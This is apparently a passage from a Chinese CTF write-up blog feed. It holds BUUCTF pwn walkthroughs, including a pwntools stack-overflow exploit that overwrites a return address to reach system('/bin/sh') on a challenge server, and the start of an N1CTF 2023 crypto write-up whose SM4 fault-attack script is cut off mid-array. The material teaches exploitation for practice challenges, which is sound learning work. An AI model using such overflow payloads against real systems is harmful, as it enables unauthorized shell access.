<h3 id="äºŒã€æ‰“å¼€IDA"><a href="#äºŒã€æ‰“å¼€IDA" class="headerlink" title="äºŒã€æ‰“å¼€IDA"></a>äºŒã€æ‰“å¼€IDA</h3><p>å°†æ–‡ä»¶æ‰”åˆ°IDAä¸­ï¼ŒæŒ‰ä¸‹shift+f12,æ‰“å¼€string windowï¼Œå‘ç°&#x2F;bin&#x2F;sh<br><img data-src="https://pic4.zhimg.com/v2-fbe627c7dd17761ef3bc56360d884f27_r.jpg"><br>åŒå‡»&#x2F;bin&#x2F;shï¼Œç‚¹å‡»commandï¼Œäº¤å‰å¼•ç”¨å¿«æ·é”®Xï¼Œå‘ç°åœ°å€åœ¨mainå‡½æ•°é‡Œ<br><img data-src="https://pic1.zhimg.com/80/v2-84f08756aa27af34ed8fa47762094234_1440w.webp"><br>æŒ‰ä¸‹f5ç¡®å®šmainå‡½æ•°å°±æ˜¯ä¸€ä¸ªç®€å•åœ°è°ƒç”¨äº†&#x2F;bin&#x2F;shçš„systemå‡½æ•°<br><img data-src="https://pic2.zhimg.com/80/v2-06f1ca937f2820c16be174944ebde851_1440w.webp"><br><del>(å…¶å®æ„Ÿè§‰å‰ä¸¤æ­¥å°±è¿™é¢˜æ¥è¯´æ²¡å¿…è¦â€¦â€¦ä½†æ˜¯çœ‹ä¸€ç¯‡åšå®¢è¯´æ‹¿åˆ°æ–‡ä»¶å…ˆchecksecä¸€ä¸‹å†IDAä¸€ä¸‹äºæ˜¯æƒ³è¯•ä¸€ä¸‹â€¦â€¦)</del></p>
<h3 id="ä¸‰ã€ç»“åˆé¢˜ç›®æç¤ºå¯çŸ¥ç›´æ¥nc"><a href="#ä¸‰ã€ç»“åˆé¢˜ç›®æç¤ºå¯çŸ¥ç›´æ¥nc" class="headerlink" title="ä¸‰ã€ç»“åˆé¢˜ç›®æç¤ºå¯çŸ¥ç›´æ¥nc"></a>ä¸‰ã€ç»“åˆé¢˜ç›®æç¤ºå¯çŸ¥ç›´æ¥nc</h3><p><del>ï¼ˆè¿™ä¸ªåœ°æ–¹ä¸€å¼€å§‹æŠ¥é”™ï¼Œä»”ç»†ä¸€çœ‹å‘ç°ctrl cvè¿‡æ¥çš„ç«¯å£é‚£é‡Œè¿˜æœ‰ä¸€ä¸ªï¼šå¾—æŠŠå†’å·å»æ‰â€¦â€¦ï¼‰</del><br>lsåˆ—å‡ºæ–‡ä»¶ç›®å½•<br><img data-src="https://pic4.zhimg.com/80/v2-d117911f69f0b5cdc99a9a7c5352489b_1440w.webp"><br>å‘ç°flagï¼Œç”¨catï¼ˆconcatenateï¼Œå‘½ä»¤ç”¨äºè¿æ¥æ–‡ä»¶å¹¶æ‰“å°åˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ä¸Šï¼‰æŠ“å–flagå¾—<br><img data-src="https://pic2.zhimg.com/80/v2-c7068e97c98c8f0dc5a292df9ab746cd_1440w.webp"></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>BUUCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>week1 T2</title>
    <url>/posts/ca38ece3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T2-rip"><a href="#T2-rip" class="headerlink" title="T2 rip"></a>T2 rip</h2><blockquote>
<p>2023-01-04WP<br>BUUCTF pwnç¬¬äºŒé¢˜<br>è€ƒç‚¹ï¼šç®€å•çš„æ ˆæº¢å‡º</p>
</blockquote>
<span id="more"></span>

<h3 id="0x01-checksec"><a href="#0x01-checksec" class="headerlink" title="0x01 checksec"></a>0x01 checksec</h3><p>æŸ¥çœ‹ä¿æŠ¤æœºåˆ¶<br><img data-src="https://pic2.zhimg.com/80/v2-58b53c6902894211862d4148de61eaa1_1440w.webp"><br>å•¥éƒ½æ²¡å¼€ï¼Œéå¸¸nice</p>
<h3 id="0x02-IDA"><a href="#0x02-IDA" class="headerlink" title="0x02 IDA"></a>0x02 IDA</h3><p>fileåæ˜¯64ä½ï¼Œæ‰”åˆ°IDAé‡Œ<br><img data-src="https://pic4.zhimg.com/80/v2-7006f2599ec061a9ccd9e41370a2c34b_1440w.webp"><br>æ‰“å¼€string window,å‘ç°æœ‰&#x2F;bin&#x2F;shï¼ŒåŒå‡»-ã€‹ç‚¹å‡»command,ctrl+Xè·³åˆ°funå‡½æ•°é‡Œ<br><del>Function windowç›´æ¥æ‰¾ä¹Ÿè¡Œâ€¦.</del><br><img data-src="https://pic2.zhimg.com/80/v2-42111c4151f4950164f04d213c23e9bd_1440w.webp"><br>ç›´æ¥f5å¤§æ³•<br>mainå‡½æ•°é‡Œå¥½åƒæ²¡å•¥ç”¨<br>çœ‹åˆ°charäº†ä¸€ä¸ªsæ•°ç»„è¿˜æœ‰getå‡½æ•°ï¼Œæ ˆæº¢å‡ºæ— ç–‘äº†<br><img data-src="https://pic3.zhimg.com/80/v2-21033c9a0be0c615a751be12c50d7a6a_1440w.webp"><br>funå‡½æ•°é‡Œæœ‰systemå‡½æ•°ï¼Œæƒ³åˆ°æŠŠfunå‡½æ•°çš„åœ°å€å‹è¿›æ ˆçš„return addressé‡Œä½¿funå‡½æ•°å¾—ä»¥æ‰§è¡Œ<br>äºæ˜¯æ‰¾å‡ºfunå‡½æ•°ä¸­è°ƒç”¨systemçš„åœ°å€0x40118A<br><img data-src="https://pic2.zhimg.com/80/v2-23ce5525745d5b11353c4a0c792f0edd_1440w.webp"><br>æœ‰äº†åœ°å€ï¼Œç°åœ¨éœ€è¦çŸ¥é“çš„æ˜¯sçš„é•¿åº¦ï¼Œåœ¨IDAä¸­å¯ä»¥æ‰¾åˆ°<br><img data-src="https://pic1.zhimg.com/80/v2-a94f13524837503afef423f2bcea458c_1440w.webp"><br>è·ç¦»rbpçš„è·ç¦»æ˜¯0Fhï¼Œä¹Ÿå°±æ˜¯sçš„å†…å­˜ç©ºé—´ä¸º15å­—èŠ‚,å½“ç„¶äº†ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œè¿˜éœ€è¦8å­—èŠ‚çš„æ•°æ®å°†rbpå¡«æ»¡ï¼Œæ‰èƒ½è®©æ•°æ®æº¢è¿‡Local Variables å’Œ Callerâ€™s rspï¼Œæº¢å‡ºè¿›å…¥Return Address</p>
<h3 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h3><p>vim pwn1.py<br><code>#pwn1.py from pwn import * p = remote(&quot;node4 .buuoj.cn&quot;,25026) payload = b&#39;a&#39; * (0xf+8) + p64(0x40118A) p.sendline(payload) p.interactive() </code><br><del>ä¸€å¼€å§‹æ²¡åŠ bâ€™â€™ç„¶åæŠ¥é”™TypeError: can only concatenate str (not â€œbytesâ€) to strâ€¦â€¦</del><br>æ‰§è¡Œè„šæœ¬å¾—åˆ°flag<br><img data-src="https://pic2.zhimg.com/80/v2-8cf32a5f0007c9057c530f3e4be55c6d_1440w.webp"></p>
<h3 id="0x04-è¡¥å……ä¸€äº›çŸ¥è¯†"><a href="#0x04-è¡¥å……ä¸€äº›çŸ¥è¯†" class="headerlink" title="0x04 è¡¥å……ä¸€äº›çŸ¥è¯†"></a>0x04 è¡¥å……ä¸€äº›çŸ¥è¯†</h3><p>IDAæ ˆå¸§è§†çª—è¯¦ç»†è¯´æ˜ï¼š<a href="https://blog.csdn.net/u012206617/article/details/87717310">è¿™ç¯‡æ–‡ç« </a><br><a href="https://blog.csdn.net/ComputerInBook/article/details/126840323">è¿™ç¯‡æ–‡ç« </a>ä¸¾äº†ä¸€ä¸ªä¾‹å­è¯¦ç»†è¯´æ˜</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>BUUCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>HASHTEAM-n1ctf-2023-WP</title>
    <url>/posts/d8c86fdf/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="HASHTEAM-n1ctf-2023-WP"><a href="#HASHTEAM-n1ctf-2023-WP" class="headerlink" title="HASHTEAM-n1ctf-2023-WP"></a>HASHTEAM-n1ctf-2023-WP</h1><p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202401310938739.PNG"></p>
<p>æ’å25ï¼Œå¡çº¿</p>
<span id="more"></span>

<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><p>nonceæœ‰é—®é¢˜</p>
<p>æ•°å­¦æ¨¡å‹ï¼š</p>
<p>e&#x3D;2^128*e1+e2</p>
<p>d&#x3D;2^128*d1+d2</p>
<p>nonce&#x3D;2^128*e1+d1</p>
<p>s&#x3D;(e+rd)&#x2F;nonce mod n</p>
<p>å±•å¼€ </p>
<p>s<em>2^128</em>e1+s<em>d1&#x3D;2^128</em>e1+e2+r*(2^128*d1+d2) mod n</p>
<p>(s-1)<em>2^128</em>e1+(s-r*2^128)<em>d1-r</em>d2-e2&#x3D;&#x3D;0 mod n</p>
<p>é€ æ ¼å­</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202401300004312.png" alt="img"></p>
<p>æ³¨æ„åˆ°dæœ€é«˜2^255ä¸€å®šä¸º1ï¼Œå¡ä¸‹ç•Œ</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202401300004049.png" alt="img"></p>
<h3 id="SM4"><a href="#SM4" class="headerlink" title="SM4"></a>SM4</h3><p>å·®åˆ†æ•…éšœæ‰“å››è½®ï¼Œç›´æ¥ä¸Šè„šæœ¬</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> copy <span class="keyword">import</span> copy</span><br><span class="line"></span><br><span class="line"><span class="variable constant_">DB</span> = [[<span class="number">46</span>, <span class="number">38</span>, <span class="number">43</span>, <span class="number">106</span>, <span class="number">114</span>, <span class="number">176</span>, <span class="number">12</span>, <span class="number">69</span>, <span class="number">1</span>, <span class="number">21</span>, <span class="number">82</span>, <span class="number">27</span>, <span class="number">184</span>, <span class="number">109</span>, <span class="number">170</span>, <span class="number">0</span>, <span class="number">179</span>, <span class="number">25</span>, <span class="number">4</span>, <span class="number">145</span>, <span class="number">33</span>, <span class="number">61</span>, <span class="number">66</span>, <span class="number">223</span>, <span class="number">85</span>, <span class="number">238</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">59</span>, <span class="number">64</span>, <span class="number">19</span>, <span class="number">174</span>, <span class="number">180</span>, <span class="number">240</span>, <span class="number">111</span>, <span class="number">128</span>, <span class="number">187</span>, <span class="number">65</span>, <span class="number">72</span>, <span class="number">35</span>, <span class="number">77</span>, <span class="number">221</span>, <span class="number">157</span>, <span class="number">172</span>, <span class="number">13</span>, <span class="number">197</span>, <span class="number">44</span>, <span class="number">229</span>, <span class="number">226</span>, <span class="number">130</span>, <span class="number">220</span>, <span class="number">49</span>, <span class="number">198</span>, <span class="number">24</span>, <span class="number">103</span>, <span class="number">76</span>, <span class="number">39</span>, <span class="number">211</span>, <span class="number">191</span>, <span class="number">115</span>, <span class="number">165</span>, <span class="number">206</span>, <span class="number">30</span>, <span class="number">7</span>, <span class="number">98</span>, <span class="number">156</span>, <span class="number">205</span>, <span class="number">181</span>, <span class="number">89</span>, <span class="number">252</span>, <span class="number">58</span>, <span class="number">138</span>, <span class="number">253</span>, <span class="number">104</span>, <span class="number">212</span>, <span class="number">236</span>, <span class="number">54</span>, <span class="number">224</span>, <span class="number">166</span>, <span class="number">155</span>, <span class="number">118</span>, <span class="number">8</span>, <span class="number">93</span>, <span class="number">140</span>, <span class="number">28</span>, <span class="number">95</span>, <span class="number">225</span>, <span class="number">248</span>, <span class="number">80</span>, <span class="number">182</span>, <span class="number">112</span>, <span class="number">63</span>, <span class="number">192</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">217</span>, <span class="number">91</span>, <span class="number">84</span>, <span class="number">144</span>, <span class="number">53</span>, <span class="number">124</span>, <span class="number">117</span>, <span class="number">16</span>, <span class="number">73</span>, <span class="number">218</span>, <span class="number">254</span>, <span class="number">188</span>, <span class="number">18</span>, <span class="number">11</span>, <span class="number">107</span>, <span class="number">222</span>, <span class="number">5</span>, <span class="number">52</span>, <span class="number">129</span>, <span class="number">194</span>, <span class="number">173</span>, <span class="number">81</span>, <span class="number">9</span>, <span class="number">137</span>, <span class="number">246</span>, <span class="number">242</span>, <span class="number">143</span>, <span class="number">175</span>, <span class="number">147</span>, <span class="number">74</span>, <span class="number">195</span>, <span class="number">41</span>, <span class="number">133</span>, <span class="number">207</span>, <span class="number">120</span>, <span class="number">92</span>, <span class="number">17</span>, <span class="number">164</span>, <span class="number">169</span>, <span class="number">171</span>, <span class="number">48</span>, <span class="number">241</span>, <span class="number">57</span>, <span class="number">31</span>, <span class="number">83</span>, <span class="number">55</span>, <span class="number">96</span>, <span class="number">29</span>, <span class="number">185</span>, <span class="number">68</span>, <span class="number">232</span>, <span class="number">70</span>, <span class="number">148</span>, <span class="number">243</span>, <span class="number">209</span>, <span class="number">100</span>, <span class="number">214</span>, <span class="number">37</span>, <span class="number">244</span>, <span class="number">219</span>, <span class="number">131</span>, <span class="number">203</span>, <span class="number">139</span>, <span class="number">126</span>, <span class="number">183</span>, <span class="number">167</span>, <span class="number">199</span>, <span class="number">101</span>, <span class="number">159</span>, <span class="number">50</span>, <span class="number">230</span>, <span class="number">168</span>, <span class="number">45</span>, <span class="number">149</span>, <span class="number">123</span>, <span class="number">119</span>, <span class="number">87</span>, <span class="number">134</span>, <span class="number">75</span>, <span class="number">127</span>, <span class="number">67</span>, <span class="number">250</span>, <span class="number">228</span>, <span class="number">247</span>, <span class="number">135</span>, <span class="number">113</span>, <span class="number">60</span>, <span class="number">62</span>, <span class="number">177</span>, <span class="number">150</span>, <span class="number">121</span>, <span class="number">162</span>, <span class="number">227</span>, <span class="number">142</span>, <span class="number">34</span>, <span class="number">178</span>, <span class="number">42</span>, <span class="number">15</span>, <span class="number">160</span>, <span class="number">161</span>, <span class="number">216</span>, <span class="number">235</span>, <span class="number">234</span>, <span class="number">163</span>, <span class="number">186</span>, <span class="number">154</span>, <span class="number">141</span>, <span class="number">233</span>, <span class="number">208</span>, <span class="number">78</span>, <span class="number">151</span>, <span class="number">204</span>, <span class="number">190</span>, <span class="number">86</span>, <span class="number">152</span>, <span class="number">245</span>, <span class="number">239</span>, <span class="number">108</span>, <span class="number">196</span>, <span class="number">158</span>, <span class="number">210</span>, <span class="number">99</span>, <span class="number">237</span>, <span class="number">251</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">90</span>, <span class="number">125</span>, <span class="number">132</span>, <span class="number">36</span>, <span class="number">215</span>, <span class="number">193</span>, <span class="number">71</span>, <span class="number">255</span>, <span class="number">200</span>, <span class="number">102</span>, <span class="number">56</span>, <span class="number">32</span>, <span class="number">136</span>, <span class="number">146</span>, <span class="number">79</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">249</span>, <span class="number">20</span>, <span class="number">202</span>, <span class="number">231</span>, <span class="number">122</span>, <span class="number">88</span>, <span class="number">94</span>, <span class="number">6</span>, <span class="number">153</span>, <span class="number">105</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">201</span>, <span class="number">189</span>, <span class="number">213</span>, <span class="number">51</span>, <span class="number">26</span>], [<span class="number">246</span>, <span class="number">56</span>, <span class="number">103</span>, <span class="number">21</span>, <span class="number">181</span>, <span class="number">105</span>, <span class="number">216</span>, <span class="number">118</span>, <span class="number">145</span>, <span class="number">183</span>, <span class="number">169</span>, <span class="number">211</span>, <span class="number">27</span>, <span class="number">242</span>, <span class="number">190</span>, <span class="number">162</span>, <span class="number">237</span>, <span class="number">179</span>, <span class="number">244</span>, <span class="number">199</span>, <span class="number">206</span>, <span class="number">35</span>, <span class="number">120</span>, <span class="number">38</span>, <span class="number">95</span>, <span class="number">133</span>, <span class="number">25</span>, <span class="number">231</span>, <span class="number">3</span>, <span class="number">70</span>, <span class="number">40</span>, <span class="number">238</span>, <span class="number">223</span>, <span class="number">45</span>, <span class="number">127</span>, <span class="number">245</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">250</span>, <span class="number">11</span>, <span class="number">52</span>, <span class="number">215</span>, <span class="number">142</span>, <span class="number">129</span>, <span class="number">167</span>, <span class="number">191</span>, <span class="number">61</span>, <span class="number">241</span>, <span class="number">188</span>, <span class="number">226</span>, <span class="number">249</span>, <span class="number">146</span>, <span class="number">221</span>, <span class="number">184</span>, <span class="number">104</span>, <span class="number">109</span>, <span class="number">157</span>, <span class="number">39</span>, <span class="number">176</span>, <span class="number">114</span>, <span class="number">236</span>, <span class="number">240</span>, <span class="number">254</span>, <span class="number">253</span>, <span class="number">251</span>, <span class="number">158</span>, <span class="number">198</span>, <span class="number">37</span>, <span class="number">42</span>, <span class="number">19</span>, <span class="number">87</span>, <span class="number">230</span>, <span class="number">153</span>, <span class="number">43</span>, <span class="number">77</span>, <span class="number">76</span>, <span class="number">208</span>, <span class="number">26</span>, <span class="number">32</span>, <span class="number">18</span>, <span class="number">150</span>, <span class="number">195</span>, <span class="number">122</span>, <span class="number">90</span>, <span class="number">80</span>, <span class="number">148</span>, <span class="number">197</span>, <span class="number">44</span>, <span class="number">83</span>, <span class="number">51</span>, <span class="number">166</span>, <span class="number">75</span>, <span class="number">88</span>, <span class="number">73</span>, <span class="number">64</span>, <span class="number">252</span>, <span class="number">20</span>, <span class="number">119</span>, <span class="number">46</span>, <span class="number">201</span>, <span class="number">196</span>, <span class="number">121</span>, <span class="number">222</span>, <span class="number">115</span>, <span class="number">22</span>, <span class="number">128</span>, <span class="number">164</span>, <span class="number">102</span>, <span class="number">97</span>, <span class="number">5</span>, <span class="number">217</span>, <span class="number">172</span>, <span class="number">177</span>, <span class="number">81</span>, <span class="number">58</span>, <span class="number">234</span>, <span class="number">168</span>, <span class="number">60</span>, <span class="number">29</span>, <span class="number">124</span>, <span class="number">147</span>, <span class="number">101</span>, <span class="number">224</span>, <span class="number">151</span>, <span class="number">130</span>, <span class="number">65</span>, <span class="number">98</span>, <span class="number">225</span>, <span class="number">155</span>, <span class="number">91</span>, <span class="number">108</span>, <span class="number">152</span>, <span class="number">140</span>, <span class="number">219</span>, <span class="number">9</span>, <span class="number">24</span>, <span class="number">189</span>, <span class="number">203</span>, <span class="number">138</span>, <span class="number">160</span>, <span class="number">59</span>, <span class="number">48</span>, <span class="number">193</span>, <span class="number">14</span>, <span class="number">69</span>, <span class="number">159</span>, <span class="number">233</span>, <span class="number">53</span>, <span class="number">135</span>, <span class="number">143</span>, <span class="number">33</span>, <span class="number">165</span>, <span class="number">41</span>, <span class="number">132</span>, <span class="number">57</span>, <span class="number">187</span>, <span class="number">227</span>, <span class="number">93</span>, <span class="number">200</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">149</span>, <span class="number">137</span>, <span class="number">194</span>, <span class="number">23</span>, <span class="number">117</span>, <span class="number">170</span>, <span class="number">247</span>, <span class="number">17</span>, <span class="number">255</span>, <span class="number">92</span>, <span class="number">205</span>, <span class="number">47</span>, <span class="number">213</span>, <span class="number">136</span>, <span class="number">66</span>, <span class="number">2</span>, <span class="number">209</span>, <span class="number">6</span>, <span class="number">110</span>, <span class="number">78</span>, <span class="number">63</span>, <span class="number">28</span>, <span class="number">74</span>, <span class="number">235</span>, <span class="number">229</span>, <span class="number">30</span>, <span class="number">139</span>, <span class="number">154</span>, <span class="number">94</span>, <span class="number">131</span>, <span class="number">49</span>, <span class="number">86</span>, <span class="number">185</span>, <span class="number">163</span>, <span class="number">79</span>, <span class="number">68</span>, <span class="number">8</span>, <span class="number">72</span>, <span class="number">174</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">141</span>, <span class="number">107</span>, <span class="number">210</span>, <span class="number">34</span>, <span class="number">207</span>, <span class="number">239</span>, <span class="number">106</span>, <span class="number">144</span>, <span class="number">228</span>, <span class="number">186</span>, <span class="number">89</span>, <span class="number">204</span>, <span class="number">55</span>, <span class="number">54</span>, <span class="number">171</span>, <span class="number">161</span>, <span class="number">100</span>, <span class="number">16</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">50</span>, <span class="number">182</span>, <span class="number">112</span>, <span class="number">173</span>, <span class="number">212</span>, <span class="number">31</span>, <span class="number">214</span>, <span class="number">85</span>, <span class="number">156</span>, <span class="number">180</span>, <span class="number">175</span>, <span class="number">116</span>, <span class="number">248</span>, <span class="number">243</span>, <span class="number">36</span>, <span class="number">82</span>, <span class="number">134</span>, <span class="number">123</span>, <span class="number">220</span>, <span class="number">10</span>, <span class="number">125</span>, <span class="number">96</span>, <span class="number">67</span>, <span class="number">62</span>, <span class="number">12</span>, <span class="number">202</span>, <span class="number">126</span>, <span class="number">71</span>, <span class="number">84</span>, <span class="number">113</span>, <span class="number">232</span>, <span class="number">178</span>, <span class="number">192</span>, <span class="number">218</span>], [<span class="number">46</span>, <span class="number">38</span>, <span class="number">43</span>, <span class="number">106</span>, <span class="number">114</span>, <span class="number">176</span>, <span class="number">12</span>, <span class="number">69</span>, <span class="number">1</span>, <span class="number">21</span>, <span class="number">82</span>, <span class="number">27</span>, <span class="number">184</span>, <span class="number">109</span>, <span class="number">170</span>, <span class="number">0</span>, <span class="number">179</span>, <span class="number">25</span>, <span class="number">4</span>, <span class="number">145</span>, <span class="number">33</span>, <span class="number">61</span>, <span class="number">66</span>, <span class="number">223</span>, <span class="number">85</span>, <span class="number">238</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">59</span>, <span class="number">64</span>, <span class="number">19</span>, <span class="number">174</span>, <span class="number">180</span>, <span class="number">240</span>, <span class="number">111</span>, <span class="number">128</span>, <span class="number">187</span>, <span class="number">65</span>, <span class="number">72</span>, <span class="number">35</span>, <span class="number">77</span>, <span class="number">221</span>, <span class="number">157</span>, <span class="number">172</span>, <span class="number">13</span>, <span class="number">197</span>, <span class="number">44</span>, <span class="number">229</span>, <span class="number">226</span>, <span class="number">130</span>, <span class="number">220</span>, <span class="number">49</span>, <span class="number">198</span>, <span class="number">24</span>, <span class="number">103</span>, <span class="number">76</span>, <span class="number">39</span>, <span class="number">211</span>, <span class="number">191</span>, <span class="number">115</span>, <span class="number">165</span>, <span class="number">206</span>, <span class="number">30</span>, <span class="number">7</span>, <span class="number">98</span>, <span class="number">156</span>, <span class="number">205</span>, <span class="number">181</span>, <span class="number">89</span>, <span class="number">252</span>, <span class="number">58</span>, <span class="number">138</span>, <span class="number">253</span>, <span class="number">104</span>, <span class="number">212</span>, <span class="number">236</span>, <span class="number">54</span>, <span class="number">224</span>, <span class="number">166</span>, <span class="number">155</span>, <span class="number">118</span>, <span class="number">8</span>, <span class="number">93</span>, <span class="number">140</span>, <span class="number">28</span>, <span class="number">95</span>, <span class="number">225</span>, <span class="number">248</span>, <span class="number">80</span>, <span class="number">182</span>, <span class="number">112</span>, <span class="number">63</span>, <span class="number">192</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">217</span>, <span class="number">91</span>, <span class="number">84</span>, <span class="number">144</span>, <span class="number">53</span>, <span class="number">124</span>, <span class="number">117</span>, <span class="number">16</span>, <span class="number">73</span>, <span class="number">218</span>, <span class="number">254</span>, <span class="number">188</span>, <span class="number">18</span>, <span class="number">11</span>, <span class="number">107</span>, <span class="number">222</span>, <span class="number">5</span>, <span class="number">52</span>, <span class="number">129</span>, <span class="number">194</span>, <span class="number">173</span>, <span class="number">81</span>, <span class="number">9</span>, <span class="number">137</span>, <span class="number">246</span>, <span class="number">242</span>, <span class="number">143</span>, <span class="number">175</span>, <span class="number">147</span>, <span class="number">74</span>, <span class="number">195</span>, <span class="number">41</span>, <span class="number">133</span>, <span class="number">207</span>, <span class="number">120</span>, <span class="number">92</span>, <span class="number">17</span>, <span class="number">164</span>, <span class="number">169</span>, <span class="number">171</span>, <span class="number">48</span>, <span class="number">241</span>, <span class="number">57</span>, <span class="number">31</span>, <span class="number">83</span>, <span class="number">55</span>, <span class="number">96</span>, <span class="number">29</span>, <span class="number">185</span>, <span class="number">68</span>, <span class="number">232</span>, <span class="number">70</span>, <span class="number">148</span>, <span class="number">243</span>, <span class="number">209</span>, <span class="number">100</span>, <span class="number">214</span>, <span class="number">37</span>, <span class="number">244</span>, <span class="number">219</span>, <span class="number">131</span>, <span class="number">203</span>, <span class="number">139</span>, <span class="number">126</span>, <span class="number">183</span>, <span class="number">167</span>, <span class="number">199</span>, <span class="number">101</span>, <span class="number">159</span>, <span class="number">50</span>, <span class="number">230</span>, <span class="number">168</span>, <span class="number">45</span>, <span class="number">149</span>, <span class="number">123</span>, <span class="number">119</span>, <span class="number">87</span>, <span class="number">134</span>, <span class="number">75</span>, <span class="number">127</span>, <span class="number">67</span>, <span class="number">250</span>, <span class="number">228</span>, <span class="number">247</span>, <span class="number">135</span>, <span class="number">113</span>, <span class="number">60</span>, <span class="number">62</span>, <span class="number">177</span>, <span class="number">150</span>, <span class="number">121</span>, <span class="number">162</span>, <span class="number">227</span>, <span class="number">142</span>, <span class="number">34</span>, <span class="number">178</span>, <span class="number">42</span>, <span class="number">15</span>, <span class="number">160</span>, <span class="number">161</span>, <span class="number">216</span>, <span class="number">235</span>, <span class="number">234</span>, <span class="number">163</span>, <span class="number">186</span>, <span class="number">154</span>, <span class="number">141</span>, <span class="number">233</span>, <span class="number">208</span>, <span class="number">78</span>, <span class="number">151</span>, <span class="number">204</span>, <span class="number">190</span>, <span class="number">86</span>, <span class="number">152</span>, <span class="number">245</span>, <span class="number">239</span>, <span class="number">108</span>, <span class="number">196</span>, <span class="number">158</span>, <span class="number">210</span>, <span class="number">99</span>, <span class="number">237</span>, <span class="number">251</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">90</span>, <span class="number">125</span>, <span class="number">132</span>, <span class="number">36</span>, <span class="number">215</span>, <span class="number">193</span>, <span class="number">71</span>, <span class="number">255</span>, <span class="number">200</span>, <span class="number">102</span>, <span class="number">56</span>, <span class="number">32</span>, <span class="number">136</span>, <span class="number">146</span>, <span class="number">79</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">249</span>, <span class="number">20</span>, <span class="number">202</span>, <span class="number">231</span>, <span class="number">122</span>, <span class="number">88</span>, <span class="number">94</span>, <span class="number">6</span>, <span class="number">153</span>, <span class="number">105</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">201</span>, <span class="number">189</span>, <span class="number">213</span>, <span class="number">51</span>, <span class="number">26</span>], [<span class="number">206</span>, <span class="number">165</span>, <span class="number">193</span>, <span class="number">37</span>, <span class="number">187</span>, <span class="number">108</span>, <span class="number">248</span>, <span class="number">246</span>, <span class="number">44</span>, <span class="number">139</span>, <span class="number">152</span>, <span class="number">201</span>, <span class="number">173</span>, <span class="number">214</span>, <span class="number">77</span>, <span class="number">72</span>, <span class="number">97</span>, <span class="number">35</span>, <span class="number">70</span>, <span class="number">24</span>, <span class="number">3</span>, <span class="number">79</span>, <span class="number">178</span>, <span class="number">175</span>, <span class="number">30</span>, <span class="number">66</span>, <span class="number">18</span>, <span class="number">198</span>, <span class="number">114</span>, <span class="number">125</span>, <span class="number">32</span>, <span class="number">210</span>, <span class="number">180</span>, <span class="number">224</span>, <span class="number">235</span>, <span class="number">28</span>, <span class="number">62</span>, <span class="number">136</span>, <span class="number">149</span>, <span class="number">227</span>, <span class="number">82</span>, <span class="number">147</span>, <span class="number">90</span>, <span class="number">119</span>, <span class="number">85</span>, <span class="number">199</span>, <span class="number">126</span>, <span class="number">121</span>, <span class="number">51</span>, <span class="number">20</span>, <span class="number">88</span>, <span class="number">4</span>, <span class="number">75</span>, <span class="number">101</span>, <span class="number">38</span>, <span class="number">151</span>, <span class="number">109</span>, <span class="number">115</span>, <span class="number">110</span>, <span class="number">223</span>, <span class="number">43</span>, <span class="number">17</span>, <span class="number">146</span>, <span class="number">249</span>, <span class="number">226</span>, <span class="number">26</span>, <span class="number">222</span>, <span class="number">232</span>, <span class="number">87</span>, <span class="number">195</span>, <span class="number">200</span>, <span class="number">131</span>, <span class="number">245</span>, <span class="number">81</span>, <span class="number">113</span>, <span class="number">157</span>, <span class="number">220</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">184</span>, <span class="number">204</span>, <span class="number">192</span>, <span class="number">84</span>, <span class="number">31</span>, <span class="number">197</span>, <span class="number">215</span>, <span class="number">129</span>, <span class="number">94</span>, <span class="number">93</span>, <span class="number">181</span>, <span class="number">218</span>, <span class="number">194</span>, <span class="number">65</span>, <span class="number">148</span>, <span class="number">158</span>, <span class="number">112</span>, <span class="number">221</span>, <span class="number">34</span>, <span class="number">25</span>, <span class="number">33</span>, <span class="number">243</span>, <span class="number">78</span>, <span class="number">10</span>, <span class="number">67</span>, <span class="number">209</span>, <span class="number">6</span>, <span class="number">252</span>, <span class="number">196</span>, <span class="number">237</span>, <span class="number">42</span>, <span class="number">172</span>, <span class="number">164</span>, <span class="number">161</span>, <span class="number">244</span>, <span class="number">111</span>, <span class="number">191</span>, <span class="number">46</span>, <span class="number">170</span>, <span class="number">128</span>, <span class="number">69</span>, <span class="number">183</span>, <span class="number">212</span>, <span class="number">60</span>, <span class="number">99</span>, <span class="number">8</span>, <span class="number">122</span>, <span class="number">49</span>, <span 